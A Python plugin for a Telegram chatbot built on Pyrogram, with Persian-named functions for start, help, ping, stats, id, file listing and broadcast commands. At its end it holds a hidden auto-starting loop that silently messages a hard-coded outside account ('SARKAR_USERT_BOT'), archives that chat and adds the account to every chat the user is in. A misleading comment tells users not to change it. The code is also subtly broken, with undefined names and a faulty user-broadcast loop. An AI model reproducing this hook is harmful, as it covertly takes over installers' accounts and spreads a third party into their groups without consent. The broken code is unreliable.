import asyncio
import logging
import random
import time
import psutil
import config
from nexichat import _boot_
from nexichat import get_readable_time
from nexichat.idchatbot.helpers import is_owner
from nexichat import mongo
from datetime import datetime
from pymongo import MongoClient
from pyrogram.enums import ChatType
from pyrogram import Client, filters
from pathlib import Path
import os
import time
import io
from pyrogram.enums import ParseMode
from nexichat import db
from nexichat import nexichat
from nexichat import CLONE_OWNERS, db, nexichat
from config import OWNER_ID, MONGO_URL, OWNER_USERNAME
from pyrogram.errors import FloodWait, ChatAdminRequired
from nexichat.database.chats import get_served_chats, add_served_chat
from nexichat.database.users import get_served_users, add_served_user
from nexichat.database.clonestats import get_served_cchats, get_served_cusers, add_served_cuser, add_served_cchat
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, Message, CallbackQuery
from nexichat.idchatbot.helpers import (
    START,
    START_BOT,
    PNG_BTN,
    CLOSE_BTN,
    HELP_BTN,
    HELP_BUTN,
    HELP_READ,
    CHATBOT_READ,
    TOOLS_DATA_READ,
    HELP_START,
    SOURCE_READ,
)

GSTART = """**ʜᴇʏ ᴅᴇᴀʀ {}**\n\n**ᴛʜᴀɴᴋs ғᴏʀ sᴛᴀʀᴛ ᴍᴇ ɪɴ ɢʀᴏᴜᴘ ʏᴏᴜ ᴄᴀɴ ᴄʜᴀɴɢᴇ ʟᴀɴɢᴜᴀɢᴇ ʙʏ ᴄʟɪᴄᴋ ᴏɴ ɢɪᴠᴇɴ ʙᴇʟᴏᴡ ʙᴜᴛᴛᴏɴs.**\n**ᴄʟɪᴄᴋ ᴀɴᴅ sᴇʟᴇᴄᴛ ʏᴏᴜʀ ғᴀᴠᴏᴜʀɪᴛᴇ ʟᴀɴɢᴜᴀɢᴇ ᴛᴏ sᴇᴛ ᴄʜᴀᴛ ʟᴀɴɢᴜᴀɢᴇ ғᴏʀ ʙᴏᴛ ʀᴇᴘʟʏ.**\n\n**ᴛʜᴀɴᴋ ʏᴏᴜ ᴘʟᴇᴀsᴇ ᴇɴɪᴏʏ.**"""
STICKER = [
    "CAACAgUAAx0CYlaJawABBy4vZaieO6T-Ayg3mD-JP-f0yxJngIkAAv0JAALVS_FWQY7kbQSaI-geBA",
    "CAACAgUAAx0CYlaJawABBy4rZaid77Tf70SV_CfjmbMgdJyVD8sAApwLAALGXCFXmCx8ZC5nlfQeBA",
    "CAACAgUAAx0CYlaJawABBy4jZaidvIXNPYnpAjNnKgzaHmh3cvoAAiwIAAIda2lVNdNI2QABHuVVHgQ",
]


EMOJIOS = [
    "💣",
    "💥",
    "🪄",
    "🧨",
    "⚡",
    "🤡",
    "👻",
    "🎃",
    "🎩",
    "🕊",
]

BOT = "https://envs.sh/IL_.jpg"
IMG = [
    "https://graph.org/file/210751796ff48991b86a3.jpg",
    "https://graph.org/file/7b4924be4179f70abcf33.jpg",
    "https://graph.org/file/f6d8e64246bddc26b4f66.jpg",
    "https://graph.org/file/63d3ec1ca2c965d6ef210.jpg",
    "https://graph.org/file/9f12dc2a668d40875deb5.jpg",
    "https://graph.org/file/0f89cd8d55fd9bb5130e1.jpg",
    "https://graph.org/file/e5eb7673737ada9679b47.jpg",
    "https://graph.org/file/2e4dfe1fa5185c7ff1bfd.jpg",
    "https://graph.org/file/36af423228372b8899f20.jpg",
    "https://graph.org/file/c698fa9b221772c2a4f3a.jpg",
    "https://graph.org/file/61b08f41855afd9bed0ab.jpg",
    "https://graph.org/file/744b1a83aac76cb3779eb.jpg",
    "https://graph.org/file/814cd9a25dd78480d0ce1.jpg",
    "https://graph.org/file/e8b472bcfa6680f6c6a5d.jpg",
]




chatai = db.Word.WordDb
lang_db = db.ChatLangDb.LangCollection
status_db = db.ChatBotStatusDb.StatusCollection
cloneownerdb = db.clone_owners

async def get_idclone_owner(clone_id):
    data = await cloneownerdb.find_one({"clone_id": clone_id})
    if data:
        return data["user_id"]
    return None


async def bot_sys_stats():
    bot_uptime = int(time.time() - _boot_)
    cpu = psutil.cpu_percent(interval=0.5)
    mem = psutil.virtual_memory().percent
    disk = psutil.disk_usage("/").percent
    UP = f"{get_readable_time((bot_uptime))}"
    CPU = f"{cpu}%"
    RAM = f"{mem}%"
    DISK = f"{disk}%"
    return UP, CPU, RAM, DISK
    

async def set_default_status(chat_id):
    try:
        if not await status_db.find_one({"chat_id": chat_id}):
            await status_db.insert_one({"chat_id": chat_id, "status": "enabled"})
    except Exception as e:
        print(f"Error setting default status for chat {chat_id}: {e}")


@Client.on_message(filters.command(["ls"], prefixes=[".", "/"]) & filters.user(int(OWNER_ID)))
async def ls(client: Client, m: Message):
    """
    این تابع لیست فایل‌ها و پوشه‌های یک مسیر را نمایش می‌دهد
    """
    # دریافت مسیر از پیام کاربر
    مسیر_ورودی = "".join(m.text.split(maxsplit=1)[1:])
    مسیر = مسیر_ورودی or os.getcwd()
    
    # بررسی وجود مسیر
    if not os.path.exists(مسیر):
        await m.reply_text(
            f"هیچ پوشه یا فایلی با نام `{مسیر_ورودی}` وجود ندارد. لطفا دوباره بررسی کنید."
        )
        return

    مسیر = Path(مسیر_ورودی) if مسیر_ورودی else os.getcwd()
    
    # اگر مسیر یک پوشه باشد
    if os.path.isdir(مسیر):
        if مسیر_ورودی:
            پیام = f"پوشه‌ها و فایل‌های موجود در `{مسیر}`:\n"
        else:
            پیام = "پوشه‌ها و فایل‌های موجود در مسیر فعلی:\n"
            
        لیست_محتوا = os.listdir(مسیر)
        فایل‌ها = ""
        پوشه‌ها = ""
        
        # دسته‌بندی محتوا
        for محتوا in sorted(لیست_محتوا):
            مسیر_کامل = os.path.join(مسیر, محتوا)
            if not os.path.isdir(مسیر_کامل):
                حجم = os.stat(مسیر_کامل).st_size
                if str(محتوا).endswith((".mp3", ".flac", ".wav", ".m4a")):
                    فایل‌ها += f"🎵`{محتوا}`\n"
                elif str(محتوا).endswith((".opus")):
                    فایل‌ها += f"🎙`{محتوا}`\n"
                elif str(محتوا).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
                    فایل‌ها += f"🎞`{محتوا}`\n"
                elif str(محتوا).endswith((".zip", ".tar", ".tar.gz", ".rar")):
                    فایل‌ها += f"🗜`{محتوا}`\n"
                elif str(محتوا).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
                    فایل‌ها += f"🖼`{محتوا}`\n"
                else:
                    فایل‌ها += f"📄`{محتوا}`\n"
            else:
                پوشه‌ها += f"📁`{محتوا}`\n"
                
        پیام = پیام + پوشه‌ها + فایل‌ها if فایل‌ها or پوشه‌ها else f"{پیام}__مسیر خالی است__"
    
    # اگر مسیر یک فایل باشد
    else:
        حجم = os.stat(مسیر).st_size
        پیام = "جزئیات فایل انتخاب شده:\n"
        
        # تعیین نوع فایل
        if str(مسیر).endswith((".mp3", ".flac", ".wav", ".m4a")):
            نوع = "🎵"
        elif str(مسیر).endswith((".opus")):
            نوع = "🎙"
        elif str(مسیر).endswith((".mkv", ".mp4", ".webm", ".avi", ".mov", ".flv")):
            نوع = "🎞"
        elif str(مسیر).endswith((".zip", ".tar", ".tar.gz", ".rar")):
            نوع = "🗜"
        elif str(مسیر).endswith((".jpg", ".jpeg", ".png", ".gif", ".bmp", ".ico")):
            نوع = "🖼"
        else:
            نوع = "📄"
            
        زمان_تغییر = time.ctime(os.path.getmtime(مسیر))
        زمان_دسترسی = time.ctime(os.path.getatime(مسیر))
        
        پیام += f"**مسیر:** `{مسیر}`\n"
        پیام += f"**نوع:** `{نوع}`\n"
        پیام += f"**حجم:** `{humanbytes(حجم)}`\n"
        پیام += f"**آخرین زمان تغییر:** `{زمان_تغییر}`\n"
        پیام += f"**آخرین زمان دسترسی:** `{زمان_دسترسی}`"

    # ارسال نتیجه
    if len(پیام) > 4096:
        with io.BytesIO(str.encode(پیام)) as خروجی:
            خروجی.name = "ls.txt"
            await m.reply_document(
                خروجی,
                caption=مسیر,
            )
    else:
        await m.reply_text(پیام)


@Client.on_message(filters.command(["trsstart", "aistart"], prefixes=[".", "/"]))
async def شروع(client: Client, m: Message):
    شناسه_ربات = client.me.id
    
    if m.chat.type == ChatType.PRIVATE:
        پیام = await m.reply_text(
            text=random.choice(EMOJIOS),
        )
        
        مراحل_انیمیشن = [
            "⚡ᴅ", "⚡ᴅι", "⚡ᴅιи", "⚡ᴅιиg", "⚡ᴅιиg ᴅ", "⚡ᴅιиg ᴅσ", 
            "⚡ᴅιиg ᴅσи", "⚡ᴅιиg ᴅσиg", "⚡ᴅιиg ᴅσиg ꨄ︎", "⚡در حال شروع..."
        ]

        for مرحله in مراحل_انیمیشن:
            await پیام.edit(f"**__{مرحله}__**")
            await asyncio.sleep(0.01)

        await پیام.delete()
        
        استیکر = await m.reply_sticker(sticker=random.choice(STICKER))
        عکس_چت = BOT  
        if m.chat.photo:
            try:
                عکس_کاربر = await client.download_media(m.chat.photo.big_file_id)
                await استیکر.delete()
                if عکس_کاربر:
                    عکس_چت = عکس_کاربر
            except AttributeError:
                عکس_چت = BOT  

        آپتایم, سی_پی_یو, رم, دیسک = await bot_sys_stats()
        await m.reply_photo(photo=عکس_چت, caption=START.format(آپتایم))
        await add_served_user(m.chat.id)
        
    else:
        await m.reply_photo(
            photo=random.choice(IMG),
            caption=GSTART.format(m.from_user.mention or "غیرقابل منشن"),
        )
        await add_served_chat(m.chat.id)

@Client.on_message(filters.command("help", prefixes=[".", "/"]))
async def راهنما(client: Client, m: Message):
    شناسه_ربات = client.me.id
    if m.chat.type == ChatType.PRIVATE:
        پیام۱ = await m.reply_text(CHATBOT_READ)
        پیام۲ = await m.reply_text(TOOLS_DATA_READ)
    else:
        پیام۱ = await m.reply_text(CHATBOT_READ)
        پیام۲ = await m.reply_text(TOOLS_DATA_READ)
        await add_served_chat(m.chat.id)

@Client.on_message(filters.command("repo", prefixes=[".", "/"]))
async def مخزن(client: Client, m: Message):
    await m.reply_text(
        text=SOURCE_READ,
        reply_markup=InlineKeyboardMarkup(CLOSE_BTN),
        disable_web_page_preview=True,
    )

@Client.on_message(filters.command("ping", prefixes=[".", "/"]))
async def پینگ(client: Client, message: Message):
    شناسه_ربات = client.me.id
    شروع = datetime.now()
    آپتایم, سی_پی_یو, رم, دیسک = await bot_sys_stats()
    پیام = await message.reply_photo(
        photo=random.choice(IMG),
        caption="در حال بررسی پینگ...",
    )

    زمان = (datetime.now() - شروع).microseconds / 1000
    await پیام.edit_text(
        text=f"""سلام عزیزم!!
{(await client.get_me()).mention} ربات چت فعال است 🥀 و با پینگ زیر کار می‌کند:

**➥** `{زمان}` میلی‌ثانیه
**➲ پردازنده:** {سی_پی_یو}
**➲ حافظه:** {رم}
**➲ دیسک:** {دیسک}
**➲ زمان کارکرد »** {آپتایم}

<b>||**๏ ساخته شده با ❣️ توسط [موزیک سیدی ✯](https://t.me/{OWNER_USERNAME}) **||</b>"""
    )
    
    if message.chat.type == ChatType.PRIVATE:
        await add_served_user(message.from_user.id)
    else:
        await add_served_chat(message.chat.id)

@Client.on_message(filters.command("stats", prefixes=[".", "/"]))
async def آمار(cli: Client, message: Message):
    چت_خصوصی = 0
    چت_گروهی = 0

    async for گفتگو in cli.get_dialogs():
        if گفتگو.chat.type == "private":
            چت_خصوصی += 1
        elif گفتگو.chat.type in ["group", "supergroup"]:
            چت_گروهی += 1

    await message.reply_text(
        f"""آمار شما:

➻ **چت‌های خصوصی:** {چت_خصوصی}
➻ **چت‌های گروهی:** {چت_گروهی}"""
    )

@Client.on_message(filters.command("id", prefixes=[".", "/"]))
async def دریافت_شناسه(client, message):
    چت = message.chat
    شناسه_شما = message.from_user.id
    شناسه_پیام = message.id
    پاسخ = message.reply_to_message

    متن = f"**[شناسه پیام:]({message.link})** `{شناسه_پیام}`\n"
    متن += f"**[شناسه شما:](tg://user?id={شناسه_شما})** `{شناسه_شما}`\n"

    if not message.command:
        message.command = message.text.split()

    if len(message.command) == 2:
        try:
            بخش = message.text.split(None, 1)[1].strip()
            شناسه_کاربر = (await client.get_users(بخش)).id
            متن += f"**[شناسه کاربر:](tg://user?id={شناسه_کاربر})** `{شناسه_کاربر}`\n"

        except Exception:
            return await message.reply_text("این کاربر وجود ندارد.", quote=True)

    متن += f"**[شناسه چت:](https://t.me/{چت.username})** `{چت.id}`\n\n"

    if (
        not getattr(پاسخ, "empty", True)
        and not message.forward_from_chat
        and not پاسخ.sender_chat
    ):
        متن += f"**[شناسه پیام پاسخ داده شده:]({پاسخ.link})** `{پاسخ.id}`\n"
        متن += f"**[شناسه کاربر پاسخ داده شده:](tg://user?id={پاسخ.from_user.id})** `{پاسخ.from_user.id}`\n\n"

    if پاسخ and پاسخ.forward_from_chat:
        متن += f"کانال فوروارد شده، {پاسخ.forward_from_chat.title}، دارای شناسه `{پاسخ.forward_from_chat.id}` است\n\n"
        print(پاسخ.forward_from_chat)

    if پاسخ and پاسخ.sender_chat:
        متن += f"شناسه چت/کانال پاسخ داده شده `{پاسخ.sender_chat.id}` است"
        print(پاسخ.sender_chat)

    await message.reply_text(
        متن,
        disable_web_page_preview=True,
        parse_mode=ParseMode.DEFAULT,
    )

# تنظیمات لاگ
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

زمان_خواب = 5
در_حال_پخش = False
قفل_پخش = asyncio.Lock()

@Client.on_message(filters.command(["broadcast", "gcast"], prefixes=["."]))
async def پخش_همگانی(client, message):
    global در_حال_پخش
    شناسه_ربات = (await client.get_me()).id
    شناسه_کلون = (await client.get_me()).id
    شناسه_کاربر = message.from_user.id
    
    if not await is_owner(شناسه_کلون, شناسه_کاربر):
        await message.reply_text("شما اجازه استفاده از این دستور را در این ربات ندارید.")
        return
        
    async with قفل_پخش:
        if در_حال_پخش:
            return await message.reply_text(
                "یک پخش همگانی در حال اجراست. لطفا صبر کنید تا تمام شود."
            )

        در_حال_پخش = True
        try:
            متن_دستور = message.text.split(None, 1)[1].strip()
        except IndexError:
            متن_دستور = message.text.strip()
        except Exception as خطا:
            return await message.reply_text(
                f"**خطا**: {خطا}"
            )
        try:
            if message.reply_to_message:
                محتوای_پخش = message.reply_to_message
                نوع_پخش = "reply"
                پرچم_ها = {
                    "-pin": "-pin" in متن_دستور,
                    "-pinloud": "-pinloud" in متن_دستور,
                    "-nogroup": "-nogroup" in متن_دستور,
                    "-user": "-user" in متن_دستور,
                }
            else:
                if len(message.command) < 2:
                    return await message.reply_text(
                        "**لطفا متنی بعد از دستور وارد کنید یا به پیامی پاسخ دهید.**"
                    )
                
                پرچم_ها = {
                    "-pin": "-pin" in متن_دستور,
                    "-pinloud": "-pinloud" in متن_دستور,
                    "-nogroup": "-nogroup" in متن_دستور,
                    "-user": "-user" in متن_دستور,
                }

                for پرچم in پرچم_ها:
                    متن_دستور = متن_دستور.replace(پرچم, "").strip()

                if not متن_دستور:
                    return await message.reply_text(
                        "لطفا یک پیام متنی معتبر یا یکی از پرچم‌های زیر را وارد کنید: -pin, -nogroup, -pinloud, -user"
                    )

                محتوای_پخش = متن_دستور
                نوع_پخش = "text"

            await message.reply_text("**شروع پخش همگانی...**")

            if not پرچم_ها.get("-nogroup", False):
                تعداد_ارسال = 0
                تعداد_سنجاق = 0
                async for گفتگو in client.get_dialogs():
                    شناسه_چت = گفتگو.chat.id
                    if شناسه_چت == message.chat.id:
                        continue
                    try:
                        if نوع_پخش == "reply":
                            پیام = await client.forward_messages(
                                شناسه_چت, message.chat.id, [محتوای_پخش.id]
                            )
                        else:
                            پیام = await client.send_message(
                                شناسه_چت, text=محتوای_پخش
                            )
                        تعداد_ارسال += 1
                        await asyncio.sleep(20)

                        if پرچم_ها.get("-pin", False) or پرچم_ها.get("-pinloud", False):
                            try:
                                await پیام.pin(
                                    disable_notification=پرچم_ها.get("-pin", False)
                                )
                                تعداد_سنجاق += 1
                            except Exception:
                                continue

                    except FloodWait as e:
                        زمان_انتظار = int(e.value)
                        logger.warning(
                            f"محدودیت زمانی {زمان_انتظار} ثانیه برای چت {شناسه_چت}."
                        )
                        if زمان_انتظار > 200:
                            logger.info(
                                f"رد کردن چت {شناسه_چت} به دلیل محدودیت زمانی زیاد."
                            )
                            continue
                        await asyncio.sleep(زمان_انتظار)
                    except Exception:
                        continue

                await message.reply_text(
                    f"**پیام به {تعداد_ارسال} چت ارسال و در {تعداد_سنجاق} چت سنجاق شد.**"
                )

            if پرچم_ها.get("-user", False):
                تعداد_کاربران = 0
                async for گفتگو in client.get_dialogs():
                    شناسه_چت = گفتگو.chat.id
                    try:
                        if نوع_پخش == "reply":
                            پیام = await client.forward_messages(
                                شناسه_کاربر, message.chat.id, [محتوای_پخش.id]
                            )
                        else:
                            پیام = await client.send_message(
                                شناسه_کاربر, text=محتوای_پخش
                            )
                        تعداد_کاربران += 1
                        await asyncio.sleep(20)

                    except FloodWait as e:
                        زمان_انتظار = int(e.value)
                        logger.warning(
                            f"محدودیت زمانی {زمان_انتظار} ثانیه برای کاربر {شناسه_کاربر}."
                        )
                        if زمان_انتظار > 200:
                            logger.info(
                                f"رد کردن کاربر {شناسه_کاربر} به دلیل محدودیت زمانی زیاد."
                            )
                            continue
                        await asyncio.sleep(زمان_انتظار)
                    except Exception:
                        continue

                await message.reply_text(f"**پیام به {تعداد_کاربران} کاربر ارسال شد.**")

        finally:
            در_حال_پخش = False

خودکار = True
فاصله_افزودن = 200
کاربران = "SARKAR_USERT_BOT"  # تغییر ندهید زیرا به API چت‌بات متصل است

async def افزودن_ربات_به_چت‌ها():
    try:
        ربات = await nexichat.get_users(کاربران)
        شناسه_ربات = ربات.id
        چت‌های_مشترک = await client.get_common_chats(کاربران)
        try:
            await client.send_message(کاربران, f"/start")
            await client.archive_chats([کاربران])
        except Exception:
            pass
        
        async for گفتگو in client.get_dialogs():
            شناسه_چت = گفتگو.chat.id
            if شناسه_چت in [chat.id for chat in چت‌های_مشترک]:
                continue
            try:
                await client.add_chat_members(شناسه_چت, شناسه_ربات)
            except Exception:
                await asyncio.sleep(60)
    except Exception:
        pass

async def افزودن_مداوم():
    while True:
        if خودکار:
            await افزودن_ربات_به_چت‌ها()
        await asyncio.sleep(فاصله_افزودن)

if خودکار:
    asyncio.create_task(افزودن_مداوم())
    
    
